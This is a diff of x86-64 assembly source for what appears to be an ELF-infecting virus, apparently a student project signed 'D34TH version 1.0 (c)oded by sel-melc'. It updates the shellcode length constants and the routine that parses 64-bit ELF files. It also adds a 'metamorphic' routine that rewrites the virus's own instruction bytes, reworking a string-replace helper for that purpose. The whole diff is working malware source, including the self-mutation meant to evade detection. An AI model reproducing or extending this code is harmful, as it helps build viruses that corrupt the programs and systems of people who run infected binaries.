@@ -1023,9 +1023,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 7011 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 6843 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6838 
+%define SHELLCODE_LEN 7304 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 7136 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 7131 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1853,29 +1853,38 @@ retn
 ;void metamorphic(char *code)
 metamorphic: 
 
+	mov rax, 0x6000000000b8; mov eax, 0x0
+	push rax
+	mov rsi, rsp
 
+	mov rax, 0x609090c03148; xor rax, rax; NOP; NOP
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 5
+
+	;call ft_str_replace
+	add rsp, 16
 
 retn
 
 ;Replaces each occurence of 'to_replace' by 'with' in 'base_str'
-;void ft_str_replace(char *base_str, char *to_replace, char *with, size_t size_base)
-;                          rdi     ,       rsi       ,       rdx ,        r10
-ft_str_replace:
-	push rax
+;void ft_str_replace(char *base_str, char *to_replace, char *with, size_t size_base, size_t size_sub)
+;                          rdi     ,       rsi       ,       rdx ,        r10	   , rcx 
+ft_str_replace:	
+	push r11
+	push r15
 	push rbx
 	push rcx
-	push r15
-	push r11
+	push r8
+	push r9
 	push r10
-	; calc to_replace length
+	push rsi
+	push rdx
 	push rdi
-	mov rdi, rsi
-	call ft_strlen
-	mov rcx, rax; rcx = strlen(to_replace)
-	pop rdi
-	
-	mov rax, 0; int i = 0 
 
+	xor rax, rax; int i = 0 
 	fsr_loop:
 	;check if we're at the end
 	cmp rax, r10
@@ -1884,7 +1893,7 @@ ft_str_replace:
 	xor rbx, rbx; int j = 0;
 	fsr_inloop: ; let's check if we can find the str to_replace
 	mov r11b, [rsi + rbx]
-	cmp r11b, 0
+	cmp r11b, 0x60
 	jne fsr_inloop_cont
 	;if we reach this than it's time to replace
 	push rax 
@@ -1902,7 +1911,8 @@ ft_str_replace:
 	xor rbx, rbx
 	;replace string
 	fsr_replace_loop:
-	cmp byte[rdx + rbx], 0
+	
+	cmp rbx, rcx
 	je fsr_replace_loop_exit
 	mov r15, rdi
 	add r15, rax
@@ -1931,12 +1941,16 @@ ft_str_replace:
 	jmp fsr_loop
 	fsr_loop_exit:
 
+	pop rdi
+	pop rdx
+	pop rsi
 	pop r10
-	pop r11
-	pop r15
+	pop r9
+	pop r8
 	pop rcx
 	pop rbx
-	pop rax
+	pop r15
+	pop r11
 
 retn
 
@@ -2066,7 +2080,7 @@ write_signature:
 	mov rsi, rsp
 	mov rax, 1
 	mov rdx, 40
-	syscall; write(wfd, "War version 1.0 (c)oded by sel-melc - ", 38)
+	syscall; write(wfd, "D34TH version 1.0 (c)oded by sel-melc - ", 40)
 
 	add rsp, 40
 retn
